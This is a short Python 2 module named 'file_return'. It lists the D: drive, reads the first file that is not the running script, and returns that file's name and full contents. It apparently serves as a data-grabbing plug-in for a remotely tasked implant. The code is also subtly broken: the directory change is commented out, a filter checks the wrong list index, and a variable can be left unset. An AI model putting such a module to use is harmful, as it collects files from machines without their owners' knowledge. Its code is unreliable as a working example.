import os
import sys

def run(**args):
	print "[*] In file_return module. "
	#os.chdir("D:\\\\")
	files = os.listdir("D:\\\\")
	for i in range(0,len(files)):
		if files[i] not in sys.argv[0]:
			if os.path.isdir(files[i])==False and files[0]!='$':
				fp=open(files[i],'r')
				content=fp.read()
				fp.close()
				break
	ans=[files[i],str(content)]
	return str(ans)
